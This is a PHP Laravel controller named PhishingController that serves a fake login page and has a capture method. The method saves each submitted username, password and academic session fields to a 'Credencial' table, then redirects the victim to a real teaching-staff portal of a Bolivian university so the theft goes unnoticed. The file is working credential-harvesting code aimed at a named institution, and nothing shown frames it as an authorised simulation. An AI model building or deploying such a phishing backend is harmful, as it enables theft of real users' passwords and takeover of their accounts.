<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use App\Models\Credencial;

class PhishingController extends Controller
{
    public function showLogin()
    {
        return view('login');
    }

    public function captureCredentials(Request $request){
        Credencial::create([
        'usuario' => $request->input('usuario'),
        'clave' => $request->input('clave'),
        'id_gestion' => $request->input('id_gestion'),
        'id_periodo' => $request->input('id_periodo'),
        'periodo' => $request->input('periodo'),
    ]);

    return redirect('https://svr4.uatf.edu.bo/docente_v_2/docente1.php');
    }
}
